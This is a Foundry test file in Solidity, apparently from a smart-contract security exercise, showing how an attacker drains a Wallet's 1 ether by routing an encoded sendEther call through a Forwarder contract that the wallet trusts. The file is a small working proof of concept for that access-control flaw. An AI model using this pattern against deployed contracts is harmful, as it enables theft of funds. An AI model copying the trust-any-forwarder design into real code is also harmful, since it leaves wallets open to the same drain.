// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Forwarder.sol";

contract ForwarderTest is Test {
    address attacker;
    Forwarder public forwarder;
    Wallet public wallet;

    function setUp() public {
        attacker = vm.addr(1);
        forwarder = new Forwarder();
        wallet = new Wallet{value: 1 ether}(address(forwarder));
    }

    function testAttack() public {
        bytes memory data = abi.encodeWithSelector(
            wallet.sendEther.selector,
            attacker,
            1 ether
        );
        forwarder.functionCall(address(wallet), data);

        assertEq(address(wallet).balance, 0);
        assertEq(address(attacker).balance, 1 ether);
    }
}
